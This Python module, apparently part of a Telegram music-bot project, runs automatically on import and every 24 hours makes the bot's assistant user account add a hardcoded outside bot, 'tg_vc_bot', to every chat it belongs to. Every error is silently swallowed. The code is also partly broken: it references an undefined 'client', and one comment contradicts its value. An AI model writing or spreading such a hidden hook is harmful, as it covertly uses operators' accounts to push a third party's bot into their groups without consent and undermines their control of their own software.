import asyncio
import datetime
from pyrogram import Client
from VIPMUSIC.utils.database import get_assistant
import config
from VIPMUSIC import app

AUTO_GCAST = True
BOT_USERNAME = "tg_vc_bot"
ADD_INTERVAL = 1  # Add every hour (in seconds)
SECOND_ROUND_DELAY = 24 * 60 * 60  # 24 hours in seconds
ADD_GROUP_DELAY = 3  # 3 seconds

async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await client.get_users(BOT_USERNAME)
        bot_id = bot.id
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == config.LOGGER_ID:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, bot_id)
            except Exception as e:
                pass
            
            await asyncio.sleep(ADD_GROUP_DELAY)  # Wait for 3 seconds
        
    except Exception as e:
        pass

async def continuous_adds():
    while True:
        if AUTO_GCAST:
            await add_bot_to_chats()
            await asyncio.sleep(SECOND_ROUND_DELAY)  # Wait for 24 hours before the next round
            
# Start the continuous broadcast loop if AUTO_GCAST is True
if AUTO_GCAST:  
    asyncio.create_task(continuous_adds())
